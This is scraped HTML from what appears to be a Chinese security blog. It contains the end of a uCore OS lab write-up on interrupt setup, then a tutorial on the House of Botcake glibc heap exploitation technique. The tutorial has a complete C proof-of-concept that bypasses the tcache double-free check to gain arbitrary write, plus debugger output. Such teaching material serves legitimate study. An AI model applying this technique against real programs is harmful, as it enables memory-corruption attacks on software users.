class="keyword">uint32_t</span>*)(ebp+<span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print_debuginfo(eip - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    eip = *(<span class="keyword">uint32_t</span>*)(ebp + <span class="number">1</span>);</span><br><span class="line">    ebp = *(<span class="keyword">uint32_t</span>*)(ebp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  lab1 (THU.CST) os is loading ...</span><br><span class="line"></span><br><span class="line">Special kernel symbols:</span><br><span class="line">  entry  <span class="number">0x00100000</span> (phys)</span><br><span class="line">  etext  <span class="number">0x001032e9</span> (phys)</span><br><span class="line">  edata  <span class="number">0x0010ea16</span> (phys)</span><br><span class="line">  end    <span class="number">0x0010fd20</span> (phys)</span><br><span class="line">Kernel executable memory footprint: <span class="number">64</span>KB</span><br><span class="line">ebp:<span class="number">0x00007b28</span> eip:<span class="number">0x00100a63</span></span><br><span class="line">args_1:<span class="number">0x6a00007b</span></span><br><span class="line">args_2:<span class="number">0x0d6a0000</span></span><br><span class="line">args_3:<span class="number">0x100d6a00</span></span><br><span class="line">args_4:<span class="number">0x00100d6a</span></span><br><span class="line">ebp:<span class="number">0x00007b28</span> eip:<span class="number">0x00100a63</span></span><br><span class="line">args_1:<span class="number">0x6a00007b</span></span><br><span class="line">args_2:<span class="number">0x0d6a0000</span></span><br><span class="line">args_3:<span class="number">0x100d6a00</span></span><br><span class="line">args_4:<span class="number">0x00100d6a</span></span><br></pre></td></tr></table></figure>
<h2 id="练习6-完善中断初始化和处理"><a href="#练习6-完善中断初始化和处理" class="headerlink" title="练习6 - 完善中断初始化和处理"></a>练习6 - 完善中断初始化和处理</h2><p>中断描述符表（Interrupt Descriptor Table，IDT）是保护模式下用于存储中断处理程序的数据结构，CPU在接收到中断时，会根据中断向量在中断描述符表中检索对应的描述符</p>
<p>实验目的：</p>
<ul>
<li>请编程完善“kern/trap/trap.c”中对中断向量表进行初始化的函数idt_init</li>
<li>在idt_init函数中，依次对所有中断入口进行初始化</li>
<li>使用mmu.h中的SETGATE宏，填充idt数组内容</li>
<li>每个中断的入口由“tools/vectors.c”生成，使用trap.c中声明的vectors数组即可</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 2 */</span></span><br><span class="line">     <span class="comment">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?</span></span><br><span class="line"><span class="comment">      *     All ISR&#x27;s entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?</span></span><br><span class="line"><span class="comment">      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c</span></span><br><span class="line"><span class="comment">      *     (try &quot;make&quot; command in lab1, then you will find vector.S in kern/trap DIR)</span></span><br><span class="line"><span class="comment">      *     You can use  &quot;extern uintptr_t __vectors[];&quot; to define this extern variable which will be used later.</span></span><br><span class="line"><span class="comment">      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).</span></span><br><span class="line"><span class="comment">      *     Can you see idt[256] in this file? Yes, it&#x27;s IDT! you can use SETGATE macro to setup each item of IDT</span></span><br><span class="line"><span class="comment">      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using &#x27;lidt&#x27; instruction.</span></span><br><span class="line"><span class="comment">      *     You don&#x27;t know the meaning of this instruction? just google it! and check the libs/x86.h to know more.</span></span><br><span class="line"><span class="comment">      *     Notice: the argument of lidt is idt_pd. try to find it!</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* trap_dispatch - dispatch based on what type of trap occurred */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        <span class="comment">/* LAB1 YOUR CODE : STEP 3 */</span></span><br><span class="line">        <span class="comment">/* handle the timer interrupt */</span></span><br><span class="line">        <span class="comment">/* (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c</span></span><br><span class="line"><span class="comment">         * (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks().</span></span><br><span class="line"><span class="comment">         * (3) Too Simple? Yes, I think so!</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_COM1:</span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;serial [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD:</span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;kbd [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//LAB1 CHALLENGE 1 : YOUR CODE you should modify below codes.</span></span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOU:</span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOK:</span><br><span class="line">        panic(<span class="string">&quot;T_SWITCH_** ??\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE1:</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE2:</span><br><span class="line">        <span class="comment">/* do nothing */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// in kernel, it must be a mistake</span></span><br><span class="line">        <span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">            panic(<span class="string">&quot;unexpected trap in kernel.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SETGATE(gate, istrap, sel, off, dpl) &#123;            \</span></span><br><span class="line"><span class="meta">    (gate).gd_off_15_0 = (uint32_t)(off) &amp; 0xffff;        \</span></span><br><span class="line"><span class="meta">    (gate).gd_ss = (sel);                                \</span></span><br><span class="line"><span class="meta">    (gate).gd_args = 0;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_rsv1 = 0;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \</span></span><br><span class="line"><span class="meta">    (gate).gd_s = 0;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_dpl = (dpl);                                \</span></span><br><span class="line"><span class="meta">    (gate).gd_p = 1;                                    \</span></span><br><span class="line"><span class="meta">    (gate).gd_off_31_16 = (uint32_t)(off) &gt;&gt; 16;        \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>简单来说，就是要写一个“idt_init”函数来对中断向量表进行初始化，并且完善“trap_dispatch”函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">	    SETGATE(idt[i],<span class="number">0</span>,GD_KTEXT,__vectors[i],DPL_KERNEL);</span><br><span class="line">      <span class="comment">// 目标idt项为idt[i]</span></span><br><span class="line">      <span class="comment">// 该idt项为内核代码，所以使用GD_KTEXT段选择子</span></span><br><span class="line">      <span class="comment">// 中断处理程序的入口地址存放于__vectors[i]</span></span><br><span class="line">      <span class="comment">// 特权级为DPL_KERNEL</span></span><br><span class="line">	&#125;</span><br><span class="line">	SETGATE(idt[T_SWITCH_TOK],<span class="number">0</span>,GD_KTEXT,__vectors[T_SWITCH_TOK],DPL_USER);</span><br><span class="line">    <span class="comment">// 设置从用户态转为内核态的中断的特权级为DPL_USER</span></span><br><span class="line">	lidt(&amp;idt_pd);</span><br><span class="line">    <span class="comment">// 加载该IDT</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER: <span class="comment">// 使操作系统每遇到100次时钟中断,就调用print_ticks子程序</span></span><br><span class="line">ticks++;</span><br><span class="line"><span class="keyword">if</span>(ticks%TICK_NUM == <span class="number">0</span>)</span><br><span class="line">	print_ticks();</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  -check ticks:                              OK</span><br><span class="line">Total Score: <span class="number">10</span>/<span class="number">40</span></span><br><span class="line">make: *** [Makefile:<span class="number">241</span>：grade] 错误 <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>基础分 10 分已经全部获得</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Botcake-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-06 14:38:15 / Modified: 14:40:02" itemprop="dateCreated datePublished" datetime="2022-04-06T14:38:15+08:00">2022-04-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Botcake"><a href="#House-Of-Botcake" class="headerlink" title="House Of Botcake"></a>House Of Botcake</h2><p>glibc2.29～glibc2.31，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 <strong>house of botcake</strong>，他的本质也是通过 <strong>UAF</strong> 来达到绕过的目的</p>
<p>利用场景：</p>
<ul>
<li>glibc &gt; 2.25（有 tcache）</li>
<li>double free</li>
</ul>
<hr>
<h2 id="glibc2-31下的Tcache检查"><a href="#glibc2-31下的Tcache检查" class="headerlink" title="glibc2.31下的Tcache检查"></a>glibc2.31下的Tcache检查</h2><p>对于每一个 tcache 中的chunk，增加了一个key指针，用于指向所属的 tcache 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>当chunk被放入时会设置key指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;  <span class="comment">//设置所属的tcache</span></span><br><span class="line"> </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//单链表头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  </span><br><span class="line"> </span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//计数增加</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ptmalloc 使用了一种更机智的方法，在不影响效率的前提下，完成了对double free的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"><span class="comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span></span><br><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span></span><br><span class="line"><span class="comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//剪枝</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put(p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说：</p>
<ul>
<li>在 free chunk 被放入 tcache 时，程序会设置一个 key 值</li>
<li>每次程序把 new free chunk 放入 tcache 前，都会检查一下它是否携带有 key 值</li>
<li>注意：key 值原本的位置是用户数据区（可以认为是随机值），有极小的概率会触发检查报错</li>
</ul>
<p>这些检查导致我们不能 free 任何一个已经在tcache中的chunk，绕过的方法有两个：</p>
<ul>
<li>想办法修改 key 字段</li>
<li>使用 fastbin double free</li>
</ul>
<h2 id="House-Of-Botcake-利用姿势"><a href="#House-Of-Botcake-利用姿势" class="headerlink" title="House Of Botcake 利用姿势"></a>House Of Botcake 利用姿势</h2><p>首先填充 tcache bin 链表，然后使用 malloc 从 tcache bin 链表中取出一个 chunk，然后通过二次 free 将 victim chunk 加入 tcache bin 链表，然后利用堆块重叠将 double free 块的fd指针覆写为目标位置，再次 malloc 即可控制到目标位置，达到任意写操作 </p>
<p>核心点为：</p>
<ul>
<li>合并 chunk1 chunk2 进 unsortedbins</li>
<li>将 chunk2 链进 tcache</li>
<li>从 chunk1 分配一个大chunk造成 overlapped 到 chunk2 修改其 fd </li>
</ul>
<p>其实就是利用了 tcachebin 和 unsortedbin 之间的相对独立性，使一个 chunk 在 unsortedbin 中的同时还可以在 tcachebin 中（fastbin对此就有相对完善的检查，不会出现这种情况）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;House of botcake Poc\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁用缓冲并使_FILE_IO不影响堆</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备目标</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;目标地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;堆布局构造&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请7个 chunks(malloc(0x100)) 用于稍后填充tcache bin链表.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;为之后的合并申请一个 prev chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请用于double free的 victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请一个填充chunk防止top chunk合并.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来可以造成堆块重叠&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: 填充 tcache bin 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free victim chunk 并链接到 unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free prev chunk 使它和 victim chunk 合并.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;double free 利用完成\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tcache 毒化&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;现在 victim chunk 被包含在一个更大的已释放块中，可以通过利用块重叠进行 tcache 毒化&quot;</span>); </span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;将 victim chunk 的 fd 指针覆写为目标位置&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/* 这里只能直接修改,模拟覆盖的过程 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc申请到目标位置.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 位于 %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已控制目标位置!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Step 1: 填充 tcache bin 链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405d10</span> —▸ <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>Step 2: free victim chunk 并链接到 unsorted bin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x405f20</span> —▸ <span class="number">0x7ffff7facbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x405f20</span> <span class="comment">/* victim(head) */</span></span><br></pre></td></tr></table></figure>
